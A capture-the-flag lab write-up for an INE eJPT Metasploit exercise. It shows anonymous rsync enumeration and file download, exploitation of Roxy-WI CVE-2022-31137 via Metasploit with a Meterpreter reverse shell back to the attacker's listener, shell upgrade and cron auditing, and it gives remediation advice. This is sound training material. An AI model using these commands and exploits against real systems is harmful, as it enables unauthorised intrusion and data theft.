# Host & Network Penetration Testing: The Metasploit Framework CTF 2 — INE / eJPT Walkthrough

---

## Lab Information

| Attribute | Specification |
| :--- | :--- |
| **Lab Name** | Host & Network Penetration Testing: The Metasploit Framework CTF 2 |
| **Platform** | INE Security |
| **Certification Track** | eJPT (Junior Penetration Tester) |
| **Domain** | Host & Network Penetration Testing — The Metasploit Framework (MSF) |
| **Target 1 Hostname / IP** | `target1.ine.local` (`192.244.166.3`) |
| **Target 2 Hostname / IP** | `target2.ine.local` (`192.244.166.4`, `roxy-wi.example.com`) |
| **Target Operating Systems** | Linux (Ubuntu-based distributions) |
| **Target Services** | RSYNC (Port 873/tcp) on Target 1; Apache 2.4.52 & Roxy-WI (Ports 80/443/tcp) on Target 2 |
| **Status** | Completed in Lab Dashboard (All 4 of 4 Flags Captured & Lab Verified) |
| **Offensive Tooling** | Nmap (v7.94SVN), Metasploit Framework (msf6), `rsync`, Meterpreter, Linux CLI (`bash`) |

---

## Table of Contents

- [01. Lab Overview](#01-lab-overview)
- [02. Learning Objectives and Flag Hints](#02-learning-objectives-and-flag-hints)
- [03. Lab Environment and Prerequisites](#03-lab-environment-and-prerequisites)
- [04. Target Identification and Network Discovery](#04-target-identification-and-network-discovery)
- [05. Target 1: Port and Service Enumeration (RSYNC)](#05-target-1-port-and-service-enumeration-rsync)
- [06. Target 1: RSYNC Banner Enumeration & Flag 1 Retrieval](#06-target-1-rsync-banner-enumeration--flag-1-retrieval)
- [07. Target 1: RSYNC File Exploration & Flag 2 Retrieval](#07-target-1-rsync-file-exploration--flag-2-retrieval)
- [08. Target 2: Port and Service Enumeration](#08-target-2-port-and-service-enumeration)
- [09. Metasploit Workspace Setup & Vulnerability Identification](#09-metasploit-workspace-setup--vulnerability-identification)
- [10. Exploit Selection and Module Configuration](#10-exploit-selection-and-module-configuration)
- [11. Exploitation and Meterpreter Session Establishment](#11-exploitation-and-meterpreter-session-establishment)
- [12. Session Management and Initial Access Verification](#12-session-management-and-initial-access-verification)
- [13. Flag 3 Retrieval: Root Filesystem Inspection](#13-flag-3-retrieval-root-filesystem-inspection)
- [14. Target 2: Scheduled Tasks Auditing & Flag 4 Retrieval](#14-target-2-scheduled-tasks-auditing--flag-4-retrieval)
- [15. Post-Exploitation Analysis: Privileges, Credentials & Lateral Movement](#15-post-exploitation-analysis-privileges-credentials--lateral-movement)
- [16. Results and Verified Flags Summary](#16-results-and-verified-flags-summary)
- [17. Consolidated Vulnerability Findings](#17-consolidated-vulnerability-findings)
- [18. Troubleshooting and Edge Cases](#18-troubleshooting-and-edge-cases)
- [19. Lessons Learned](#19-lessons-learned)
- [20. Tools and Commands Reference](#20-tools-and-commands-reference)
- [21. Evidence and Screenshot Index](#21-evidence-and-screenshot-index)
- [22. References](#22-references)

---

## 01. Lab Overview

This hands-on laboratory assessment is a core capstone challenge in the **INE eJPT (Junior Penetration Tester)** curriculum under the **Host & Network Penetration Testing: The Metasploit Framework (MSF)** domain. The scenario simulates a dual-target corporate infrastructure consisting of a dedicated backup server and a centralized web-based infrastructure management appliance.

The engagement requires demonstrating comprehensive multi-host penetration testing methodology across two distinct Linux systems:
1. **Target 1 (`target1.ine.local`)**: A storage and backup host running an unauthenticated RSYNC service, requiring network service discovery, banner analysis, module listing, and remote file exfiltration.
2. **Target 2 (`target2.ine.local`)**: A web management gateway running the **Roxy-WI** appliance, vulnerable to unauthenticated remote command execution (CVE-2022-31137), requiring exploit selection and weaponization via the Metasploit Framework, interactive payload session management, root directory traversal, and cron job auditing.

### Target Environment Evidence

The screenshot below displays the completed INE challenge dashboard, verifying that all four challenge objectives have been completed and validated.

![Lab Environment Overview](screenshots/01-lab-overview.png)

---

## 02. Learning Objectives and Flag Hints

The challenge dashboard specifies four clear operational objectives:

1. **Flag 1:**
   - **Prompt**: *"Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting."*
   - **Technical Focus**: Discovering port 873/tcp on `target1.ine.local`, querying the RSYNC daemon, and extracting Flag 1 directly from the exposed module description banner.
2. **Flag 2:**
   - **Prompt**: *"The files on the RSYNC server hold valuable information. Explore the contents to find the flag."*
   - **Technical Focus**: Enumerating files inside the accessible RSYNC share (`backupwscohen`), synchronizing and downloading sensitive backup archives locally, and discovering Flag 2 embedded in `pii_data.xlsx`.
3. **Flag 3:**
   - **Prompt**: *"Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local."*
   - **Technical Focus**: Fingerprinting web services on `target2.ine.local`, identifying the vulnerable Roxy-WI application, configuring Metasploit's `exploit/linux/http/roxy_wi_exec`, obtaining a Meterpreter reverse shell, and retrieving Flag 3 from `/flag.txt`.
4. **Flag 4:**
   - **Prompt**: *"Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag."*
   - **Technical Focus**: Auditing Linux automated scheduling mechanisms (`cron`), conducting targeted recursive file inspection across `/etc`, and extracting Flag 4 from `/etc/cron.d/www-data-cron`.

---

## 03. Lab Environment and Prerequisites

The assessment operates within an isolated virtual laboratory network provided by INE:

- **Attacker System**: Kali Linux desktop environment (`192.244.166.2`).
- **Target Subnet**: `192.244.166.0/24`.
- **Target 1**: `target1.ine.local` (`192.244.166.3`, MAC: `02:42:C0:F4:A6:03`).
- **Target 2**: `target2.ine.local` (`192.244.166.4`, MAC: `02:42:C0:F4:A6:04`, Hostname: `roxy-wi.example.com`).
- **Pre-configured Name Resolution**: Hostnames `target1.ine.local` and `target2.ine.local` are mapped to their respective IP addresses in `/etc/hosts`.

---

## 04. Target Identification and Network Discovery

Initial verification confirmed that both target hostnames resolve and respond across the local subnet:

```bash
ping -c 2 target1.ine.local
ping -c 2 target2.ine.local
```

Both hosts reside within the same local `/24` broadcast domain (`192.244.166.0/24`) with sub-millisecond network latency:
- **`target1.ine.local`**: Resolved to `192.244.166.3`.
- **`target2.ine.local`**: Resolved to `192.244.166.4`.

Network discovery confirmed that no firewall filtering or port blocking was present between the attacker machine and the targets on the internal testing network.

---

## 05. Target 1: Port and Service Enumeration (RSYNC)

### Full TCP Port Sweep on Target 1

A full TCP port scan was executed across all 65,535 ports using Nmap:

```bash
nmap -T4 -sV -sC -p- target1.ine.local
```

**Terminal Output:**
```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-23 18:29 IST
Nmap scan report for target1.ine.local (192.244.166.3)
Host is up (0.000021s latency).
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
MAC Address: 02:42:C0:F4:A6:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds
```

![Nmap Scan Target 1](screenshots/02-nmap-target1-rsync-scan.png)

**Enumeration Findings for Target 1:**
- **Open Port**: `873/tcp`
- **Service**: `rsync` protocol version 31
- **All other ports**: 65,534 closed ports (TCP RST received)
- **Attack Surface**: The host functions as an isolated RSYNC data synchronization endpoint.

---

## 06. Target 1: RSYNC Banner Enumeration & Flag 1 Retrieval

### Objective
*"Enumerate the open port using Metasploit, and inspect the RSYNC banner closely; it might reveal something interesting."*

### Technical Concept: RSYNC Protocol & Banner Disclosure
The RSYNC daemon protocol enables remote synchronization of directory trees. When an RSYNC daemon is queried with module listing commands (such as `rsync host::` or via Metasploit's `auxiliary/scanner/rsync/modules_list`), the daemon returns a list of configured module names alongside their administrative comment strings. If administrators place sensitive text or security flags within the comment parameter in `/etc/rsyncd.conf`, this metadata is publicly disclosed without authentication.

### Querying RSYNC Modules & Banner
Connecting to `target1.ine.local` using the native `rsync` client:

```bash
rsync target1.ine.local::
```

**Observed Terminal Output:**
```text
backupwscohen   FLAG1_7956a8a6e8084699a3b659f13b06bdb0
```

![Flag 1 RSYNC Banner](screenshots/03-target1-rsync-banner-flag1.png)

**Analysis:**
The RSYNC daemon advertises an active module named `backupwscohen`. The module description comment directly discloses the complete Flag 1 string.

```text
Flag 1 Location: target1.ine.local:: (Module description comment)
Flag 1 Value:    FLAG1_7956a8a6e8084699a3b659f13b06bdb0
Status:          Visually Verified
```

---

## 07. Target 1: RSYNC File Exploration & Flag 2 Retrieval

### Objective
*"The files on the RSYNC server hold valuable information. Explore the contents to find the flag."*

### Step 1: Listing Remote Files in `backupwscohen`

Before synchronizing data, the contents of the `backupwscohen` module were inspected using `--list-only`:

```bash
rsync --list-only target1.ine.local::backupwscohen/
```

**Observed Terminal Output:**
```text
drwxr-xr-x          4,096 2026/11/23 18:26:56 .
-rw-r--r--             20 2024/10/28 15:05:40 TPSData.txt
-rw-r--r--             25 2024/10/28 15:05:40 office_staff.vhd
-rw-r--r--             39 2026/11/23 18:26:56 pii_data.xlsx
```

![Flag 2 RSYNC File Listing](screenshots/04-target1-rsync-module-listing.png)

**Directory Findings:**
The module exposes three files:
- `TPSData.txt` (20 bytes)
- `office_staff.vhd` (25 bytes)
- `pii_data.xlsx` (39 bytes, simulated Personally Identifiable Information spreadsheet)

### Step 2: Downloading Exposed Files

A local staging directory was created, and all files were exfiltrated using `rsync -av`:

```bash
mkdir rsync_files
rsync -av target1.ine.local::backupwscohen/ ./rsync_files/
```

**Observed Terminal Output:**
```text
receiving incremental file list
./
TPSData.txt
office_staff.vhd
pii_data.xlsx

sent 84 bytes  received 341 bytes  850.00 bytes/sec
total size is 84  speedup is 0.20
```

![Flag 2 Exfiltration](screenshots/05-target1-rsync-file-download.png)

### Step 3: Inspecting Exfiltrated Data & Retrieving Flag 2

Navigating to the download folder and reading the files:

```bash
cd rsync_files
ls
cat TPSData.txt
cat pii_data.xlsx
```

**Observed Terminal Output:**
```text
Sample data for TPS
FLAG2_eabf8eb725164d73992246eb77fde35b
```

![Flag 2 Extraction](screenshots/06-target1-flag2-retrieval.png)

**Analysis:**
While `TPSData.txt` contained generic sample text, `pii_data.xlsx` contained Flag 2 stored in cleartext.

```text
Flag 2 Location: backupwscohen/pii_data.xlsx
Flag 2 Value:    FLAG2_eabf8eb725164d73992246eb77fde35b
Status:          Visually Verified
```

---

## 08. Target 2: Port and Service Enumeration

### Full TCP Port Sweep on Target 2

With Target 1 fully enumerated and Flags 1 and 2 retrieved, attention shifted to `target2.ine.local` (`192.244.166.4`):

```bash
nmap -T4 -sV -sC -p- target2.ine.local
```

**Terminal Output:**
```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-23 18:42 IST
Nmap scan report for target2.ine.local (192.244.166.4)
Host is up (0.000024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Roxy-WI
|_http-server-header: Apache/2.4.52 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.52
| ssl-cert: Subject: commonName=*.roxy-wi.org/organizationName=Roxy-WI/stateOrProvinceName=Almaty/countryName=US
| Not valid before: 2022-07-29T05:20:44
| Not valid after:  2050-12-14T05:20:44
|_http-title: Roxy-WI
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: roxy-wi.example.com
```

![Nmap Scan Target 2](screenshots/07-nmap-target2-service-scan.png)

**Enumeration Findings for Target 2:**
- **Operating System**: Ubuntu Linux (inferred from Apache banner `Apache/2.4.52 (Ubuntu)`).
- **Web Server**: Apache httpd 2.4.52 listening on ports `80/tcp` (plain HTTP) and `443/tcp` (HTTPS with SSL).
- **Web Application**: **Roxy-WI** (a web interface for managing HAProxy, Nginx, Apache, and Keepalived servers).
- **Virtual Host / Certificate**: Common Name `*.roxy-wi.org`, virtual host `roxy-wi.example.com`.

---

## 09. Metasploit Workspace Setup & Vulnerability Identification

### Metasploit Workspace Management
To organize findings and store service records across both targets, an MSF database workspace was initialized:

```bash
msfconsole -q
```

```text
msf6 > workspace -a ctf2_msf
[*] Added workspace: ctf2_msf
[*] Workspace: ctf2_msf

msf6 > db_nmap -T4 -sV -sC -p- 192.244.166.3 192.244.166.4
msf6 > hosts
msf6 > services
```

### Vulnerability Analysis: Roxy-WI Remote Command Execution (CVE-2022-31137)
Roxy-WI versions prior to `6.1.1.0` suffer from an unauthenticated OS command injection vulnerability in `/app/options.py`.
- **Root Cause**: The application passes user-controlled parameters from HTTP requests directly to underlying shell execution functions via `subprocess_execute()` without sanitization.
- **Impact**: Remote unauthenticated attackers can execute arbitrary shell commands under the web service account (`www-data`).
- **Identifiers**: **CVE-2022-31137** (NVD CVSS:3.1 Base Score: **9.8 Critical**, `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`).

### Searching for Roxy-WI Exploit Modules in Metasploit

```text
msf6 > search Roxy-WI
```

**Observed Result:**
```text
Matching Modules
================

   #  Name                             Disclosure Date  Rank       Check  Description
   -  ----                             ---------------  ----       -----  -----------
   0  exploit/linux/http/roxy_wi_exec  2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE
   1   \_ target: Unix (In-Memory)     .                .          .      .
   2   \_ target: Linux (Dropper)      .                .          .      .
```

![Metasploit Search Roxy-WI](screenshots/08-msf-search-roxy-wi.png)

The module `exploit/linux/http/roxy_wi_exec` has an **Excellent** reliability ranking and contains an automated pre-exploitation vulnerability check method (`Check: Yes`).

---

## 10. Exploit Selection and Module Configuration

### Selecting the Module & Reviewing Parameters

Load the exploit module:

```text
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/roxy_wi_exec) > options
```

![Metasploit Roxy-WI Options](screenshots/09-msf-roxy-wi-options.png)

**Key Parameter Configuration:**
- `RHOSTS`: Target IP address (`192.244.166.4`).
- `RPORT`: Target HTTPS port (`443`, default).
- `SSL`: SSL negotiation enabled (`true`, default).
- `TARGETURI`: Base application URI (`/`, default).
- `LHOST`: Attacker listening IP address (`192.244.166.2`).
- `LPORT`: Attacker listening port (`4444`, default).
- `Payload`: Automatically defaulted to `cmd/unix/python/meterpreter/reverse_tcp`.

```text
msf6 exploit(linux/http/roxy_wi_exec) > set rhosts 192.244.166.4
rhosts => 192.244.166.4
msf6 exploit(linux/http/roxy_wi_exec) > set lhost 192.244.166.2
lhost => 192.244.166.2
```

---

## 11. Exploitation and Meterpreter Session Establishment

### Firing the Exploit

With all parameters configured, the exploit was launched against `target2.ine.local`:

```text
msf6 exploit(linux/http/roxy_wi_exec) > exploit
```

**Observed Terminal Output:**
```text
[*] Started reverse TCP handler on 192.244.166.2:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.244.166.4:443 is vulnerable!
[*] 192.244.166.4:443 is vulnerable!
[+] The target is vulnerable. The device responded to exploitation with a 200 OK and test command successfully executed.
[*] Exploiting...
[*] Sending stage (24772 bytes) to 192.244.166.4
[*] Meterpreter session 1 opened (192.244.166.2:4444 -> 192.244.166.4:55752) at 2026-11-23 18:49:26 +0530

meterpreter >
```

![Exploit Execution and Meterpreter Session](screenshots/10-msf-roxy-wi-exploitation.png)

**Exploit Execution Lifecycle:**
1. The module initialized a local reverse TCP handler on `192.244.166.2:4444`.
2. The automatic check routine verified that `192.244.166.4:443` was vulnerable by sending a test command injection payload and confirming a `200 OK` response with successful test output.
3. The weaponized command injection payload was transmitted to `/app/options.py`.
4. The target executed the injected command, which initiated a reverse connection back to the handler.
5. The 24,772-byte Python Meterpreter stage was transmitted, and **Meterpreter Session 1** was established.

---

## 12. Session Management and Initial Access Verification

### Spawning an Interactive Shell from Meterpreter

Meterpreter provides post-exploitation interaction capabilities directly within the target process environment:

```text
meterpreter > cd ..
meterpreter > cd /
meterpreter > shell
```

**Observed Terminal Output:**
```text
Process 365 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (362): Inappropriate ioctl for device
bash: no job control in this shell
www-data@target2:/$ cd ..
cd ..
www-data@target2:/$ ls
ls
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www-data@target2:/$ cat flag.txt
```

![Meterpreter Shell Spawning](screenshots/11-meterpreter-shell-target2.png)

**Initial Access Verification:**
- **User Identity**: `www-data` (the standard low-privileged service account assigned to the Apache web server).
- **Working Directory**: `/` (root directory).
- **Filesystem Verification**: Running `ls` immediately revealed the presence of `flag.txt` alongside standard Linux root directories (`bin`, `boot`, `dev`, `etc`, `home`, `root`, `var`).

---

## 13. Flag 3 Retrieval: Root Filesystem Inspection

### Objective
*"Try exploiting the webapp to gain a shell using Metasploit on target2.ine.local."*

### Reading Flag 3
Executing `cat flag.txt` from the root directory:

```bash
cat flag.txt
```

**Observed Terminal Output:**
```text
www-data@target2:/$ FLAG3_aa0038d5756743bfa80796ebea45bdd2
```

![Flag 3 Reading](screenshots/12-target2-flag3-retrieval.png)

```text
Flag 3 Location: /flag.txt (Root filesystem on target2.ine.local)
Flag 3 Value:    FLAG3_aa0038d5756743bfa80796ebea45bdd2
Status:          Visually Verified
```

---

## 14. Target 2: Scheduled Tasks Auditing & Flag 4 Retrieval

### Objective
*"Automated tasks can sometimes leave clues. Investigate scheduled jobs or running processes to uncover the hidden flag."*

### Technical Concept: Auditing Automated Tasks & Crontabs
In Linux systems, automated tasks are managed by the `cron` daemon. Scheduled job definitions are placed across multiple standard locations:
- System crontab: `/etc/crontab`
- Directory-based cron tables: `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.weekly/`, `/etc/cron.monthly/`
- User spool files: `/var/spool/cron/crontabs/`

Automated scripts frequently embed configuration parameters, backup scripts, and sensitive tokens. System administrators or automated provisioning routines occasionally expose credentials or sensitive data in world-readable cron entries.

### Recursive Search Across `/etc`

Traversing into `/etc` and executing a recursive, case-insensitive search for "flag":

```bash
cd etc
grep -ri "flag" /etc
```

**Observed Terminal Output:**
```text
grep: /etc/shadow: Permission denied
grep: /etc/.pwd.lock: Permission denied
grep: /etc/security/opasswd: Permission denied
grep: /etc/gshadow: Permission denied
grep: /etc/sudoers.d/README: Permission denied
grep: /etc/sudoers: Permission denied
grep: /etc/mysql/debian.cnf: Permission denied
grep: /etc/shadow-: Permission denied
grep: /etc/ssl/private: Permission denied
grep: /etc/gshadow-: Permission denied
www-data@target2:/etc$ /etc/pam.conf:# name    type    flag
/etc/default/useradd:# This argument is used when the -n flag is specified.
/etc/netconfig:#    <network_id> <semantics> <flags> <protofamily> <protoname> \
/etc/security/namespace.init:# a flag whether the instance dir was newly created (0 - no, 1 - yes) in $3,
/etc/cron.d/www-data-cron:* * * * * www-data echo "FLAG4_d489d5d9736b4975bb8e644eb6335e4c"
/etc/sudo_logsrvd.conf:# flag.  If no port is specified, port 30343 will be used for plaintext
/etc/matplotlibrc:## FreeType hinting flag ("foo" corresponds to FT_LOAD_FOO); may be one of the
/etc/fonts/conf.avail/90-synthetic.conf:        set the embolden flag
```

![Flag 4 Cron Discovery](screenshots/13-target2-flag4-cron-discovery.png)

**Analysis:**
The recursive search surfaced a scheduled cron task located at `/etc/cron.d/www-data-cron`. The cron entry is configured to run every minute (`* * * * *`) under user `www-data`, executing an `echo` statement that outputs the Flag 4 string.

```text
Flag 4 Location: /etc/cron.d/www-data-cron
Flag 4 Value:    FLAG4_d489d5d9736b4975bb8e644eb6335e4c
Status:          Visually Verified
```

---

## 15. Post-Exploitation Analysis: Privileges, Credentials & Lateral Movement

### 1. Privilege Posture
- Initial access was achieved directly as service account `www-data`.
- Permissions on sensitive system files (`/etc/shadow`, `/etc/sudoers`, `/etc/ssl/private`) were strictly enforced, returning `Permission denied`.
- Because Flag 3 (`/flag.txt`) was world-readable and Flag 4 (`/etc/cron.d/www-data-cron`) was readable by `www-data`, complete challenge completion did not require kernel exploitation or local root escalation.

### 2. Credential Discovery
- On Target 1, anonymous RSYNC access allowed exfiltrating `pii_data.xlsx`, `office_staff.vhd`, and `TPSData.txt`.
- On Target 2, hardcoded operational strings were discovered within cron job configuration definitions.

### 3. Lateral Movement Context
- Both targets reside within the same local subnet (`192.244.166.0/24`).
- Target 2 was directly routable and exposed on ports 80 and 443, enabling direct exploitation without requiring an intermediate proxy or pivoting tunnel through Target 1.

---

## 16. Results and Verified Flags Summary

All four challenge objectives were completed successfully across both target machines:

| Objective | Target Host | Operating Context | File / Asset Path | Verified Flag String | Validation Status |
| :---: | :---: | :--- | :--- | :--- | :---: |
| **Flag 1** | `target1.ine.local` (`192.244.166.3`) | Anonymous RSYNC Query | `target1.ine.local::backupwscohen` (Banner) | `FLAG1_7956a8a6e8084699a3b659f13b06bdb0` | Visually Verified |
| **Flag 2** | `target1.ine.local` (`192.244.166.3`) | Anonymous RSYNC Download | `backupwscohen/pii_data.xlsx` | `FLAG2_eabf8eb725164d73992246eb77fde35b` | Visually Verified |
| **Flag 3** | `target2.ine.local` (`192.244.166.4`) | `www-data` Interactive Shell | `/flag.txt` | `FLAG3_aa0038d5756743bfa80796ebea45bdd2` | Visually Verified |
| **Flag 4** | `target2.ine.local` (`192.244.166.4`) | `www-data` Interactive Shell | `/etc/cron.d/www-data-cron` | `FLAG4_d489d5d9736b4975bb8e644eb6335e4c` | Visually Verified |

---

## 17. Consolidated Vulnerability Findings

### 1. Unauthenticated Remote Command Execution in Roxy-WI (CVE-2022-31137)
- **Affected System**: `target2.ine.local` (`192.244.166.4:443`)
- **Severity**: **Critical** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Base Score: **9.8**)
- **Vulnerability Description**: Roxy-WI instances prior to version `6.1.1.0` execute external system commands through `/app/options.py` without proper input neutralization. Because this endpoint requires no prior authentication, remote unauthenticated attackers can inject arbitrary shell commands, gaining an interactive command shell as `www-data`.
- **CWE**: [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- **Remediation**:
  - Upgrade Roxy-WI immediately to version `6.1.1.0` or later.
  - Implement strict parameterized input handling and avoid passing unsanitized user arguments directly to underlying shell processes.
  - Restrict access to administrative web interfaces using network ACLs and VPN gateways.

### 2. Anonymous RSYNC Module Exposure & Sensitive Data Leakage
- **Affected System**: `target1.ine.local` (`192.244.166.3:873`)
- **Severity**: **High** (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Base Score: **7.5**)
- **Vulnerability Description**: The RSYNC daemon is configured to allow unrestricted anonymous connections. The service publicly advertises module names, exposes descriptive comments containing sensitive flags, and permits unauthorized exfiltration of internal files (`pii_data.xlsx`, `office_staff.vhd`).
- **CWE**: [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- **Remediation**:
  - Enforce authentication on all RSYNC modules by configuring `auth users` and a secure `secrets file`.
  - Restrict access to authorized client IP addresses using the `hosts allow` directive in `/etc/rsyncd.conf`.
  - Disable module listing globally by setting `list = false`.

### 3. Cleartext Sensitive Information in Automated Task Definitions
- **Affected System**: `target2.ine.local` (`/etc/cron.d/www-data-cron`)
- **Severity**: **Medium** (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — Base Score: **5.5**)
- **Vulnerability Description**: Sensitive operational strings and flags were stored directly in plaintext inside `/etc/cron.d/www-data-cron`. While administrative permissions are required to modify cron files, default file permissions permit low-privileged local service accounts to read scheduled job parameters.
- **CWE**: [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)
- **Remediation**:
  - Avoid embedding secrets, authentication tokens, or sensitive variables directly within system crontabs.
  - Store configuration parameters in restricted environment files or dedicated secret management stores with strict ACLs (`chmod 600`).

---

## 18. Troubleshooting and Edge Cases

1. **RSYNC Syntax Variations**:
   - Querying daemon modules requires double-colon syntax (`rsync host::`), whereas SSH-encapsulated rsync uses a single colon (`rsync user@host:/path`).
   - Forgetting the trailing slash on directories (e.g. `rsync -av host::backup/ ./` vs `rsync -av host::backup ./`) can affect directory nesting upon local synchronization.
2. **Metasploit AutoCheck Behavior**:
   - The `roxy_wi_exec` module features built-in target verification (`AutoCheck`). In environments where network responses are slow or proxies intercept traffic, the check method can occasionally time out; setting `set AutoCheck false` allows bypassing the pre-check if manual verification has confirmed target version vulnerability.
3. **Pseudo-Terminal Job Control**:
   - Spawning `/bin/bash` via Meterpreter's `shell` command outputs `bash: no job control in this shell`. This is standard non-TTY behavior. Full TTY interaction (for text editors or interactive password prompts) can be established via Python pty spawning:
     ```python
     python3 -c 'import pty; pty.spawn("/bin/bash")'
     ```

---

## 19. Lessons Learned

1. **Protocol Specific Reconnaissance**: Non-standard protocols such as RSYNC (873), NFS (2049), and SMB (445) frequently expose substantial data without requiring exploitation when misconfigured for anonymous access.
2. **Administrative Appliances as Attack Vectors**: Web-based administration tools (Roxy-WI, Webmin, Cockpit) represent high-value targets. Because they inherently manage core system services, vulnerabilities in these appliances frequently lead directly to root or critical service context execution.
3. **System Auditing via Recursive Text Searches**: When seeking artifacts or configuration anomalies across an unfamiliar Linux system, targeting `/etc` with case-insensitive recursive grep searches (`grep -ri "keyword" /etc`) quickly surfaces automated tasks, crontabs, and service credentials.

---

## 20. Tools and Commands Reference

| Phase | Tool | Command Line | Operational Purpose |
| :--- | :--- | :--- | :--- |
| **Port Scanning** | Nmap | `nmap -T4 -sV -sC -p- target1.ine.local` | Full TCP sweep and version detection on Target 1. |
| **Port Scanning** | Nmap | `nmap -T4 -sV -sC -p- target2.ine.local` | Full TCP sweep and service detection on Target 2. |
| **Service Enum** | RSYNC CLI | `rsync target1.ine.local::` | Queries exposed RSYNC modules and banner comments (Flag 1). |
| **Service Enum** | RSYNC CLI | `rsync --list-only target1.ine.local::backupwscohen/` | Lists files within the remote RSYNC backup share. |
| **Exfiltration** | RSYNC CLI | `rsync -av target1.ine.local::backupwscohen/ ./rsync_files/` | Downloads exposed files locally for offline inspection. |
| **Data Analysis** | Bash CLI | `cat pii_data.xlsx` | Reads exfiltrated data to extract Flag 2. |
| **Exploitation** | Metasploit | `use exploit/linux/http/roxy_wi_exec` | Loads Roxy-WI command injection exploit module. |
| **Configuration** | Metasploit | `set rhosts 192.244.166.4` | Configures target IP address. |
| **Configuration** | Metasploit | `set lhost 192.244.166.2` | Configures attacker listener IP address. |
| **Execution** | Metasploit | `exploit` | Executes attack and establishes Meterpreter Session 1. |
| **Shell Access** | Meterpreter | `shell` | Spawns interactive Linux Bash shell. |
| **File Retrieval** | Bash CLI | `cat /flag.txt` | Extracts Flag 3 from root filesystem. |
| **Cron Auditing** | Bash CLI | `grep -ri "flag" /etc` | Recursively searches `/etc` to uncover Flag 4 in cron job. |

---

## 21. Evidence and Screenshot Index

All thirteen primary evidence screenshots appear sequentially throughout the walkthrough:

| # | Filename | Status | Description & Key Evidence |
| :---: | :--- | :---: | :--- |
| **01** | `01-lab-overview.png` | **Available** | INE lab dashboard confirming 4 of 4 flags captured and activity finished. |
| **02** | `02-nmap-target1-rsync-scan.png` | **Available** | Nmap port scan on `target1.ine.local` detecting port 873/tcp running RSYNC protocol 31. |
| **03** | `03-target1-rsync-banner-flag1.png` | **Available** | Executing `rsync target1.ine.local::` uncovering module `backupwscohen` and Flag 1 in comment. |
| **04** | `04-target1-rsync-module-listing.png` | **Available** | Running `rsync --list-only` showing `TPSData.txt`, `office_staff.vhd`, and `pii_data.xlsx`. |
| **05** | `05-target1-rsync-file-download.png` | **Available** | Running `mkdir rsync_files` and `rsync -av` to download files locally. |
| **06** | `06-target1-flag2-retrieval.png` | **Available** | Reading `pii_data.xlsx` with `cat` to extract Flag 2. |
| **07** | `07-nmap-target2-service-scan.png` | **Available** | Nmap scan on `target2.ine.local` detecting Apache 2.4.52 and Roxy-WI on ports 80/443. |
| **08** | `08-msf-search-roxy-wi.png` | **Available** | Searching `msfconsole` for `Roxy-WI` and finding `exploit/linux/http/roxy_wi_exec`. |
| **09** | `09-msf-roxy-wi-options.png` | **Available** | Inspecting module options and setting payload parameters in msfconsole. |
| **10** | `10-msf-roxy-wi-exploitation.png` | **Available** | Setting `rhosts`/`lhost`, running `exploit`, vulnerability confirmation, and session 1 opened. |
| **11** | `11-meterpreter-shell-target2.png` | **Available** | Spawning interactive shell from Meterpreter, traversing to `/`, and listing directory. |
| **12** | `12-target2-flag3-retrieval.png` | **Available** | Executing `cat flag.txt` to extract Flag 3. |
| **13** | `13-target2-flag4-cron-discovery.png` | **Available** | Running `grep -ri "flag" /etc` uncovering Flag 4 inside `/etc/cron.d/www-data-cron`. |

---

## 22. References

- [CVE-2022-31137: Roxy-WI Remote Code Execution Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2022-31137)
- [Rapid7 Metasploit Exploit Module: roxy_wi_exec](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/roxy_wi_exec.rb)
- [MITRE ATT&CK: Command and Scripting Interpreter: Unix Shell (T1059.004)](https://attack.mitre.org/techniques/T1059/004/)
- [MITRE ATT&CK: Scheduled Task/Job: Cron (T1053.003)](https://attack.mitre.org/techniques/T1053/003/)
- [MITRE ATT&CK: Data from Information Repositories (T1213)](https://attack.mitre.org/techniques/T1213/)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)
- [RSYNC Documentation: rsyncd.conf Manpage](https://download.samba.org/pub/rsync/rsyncd.conf.5)
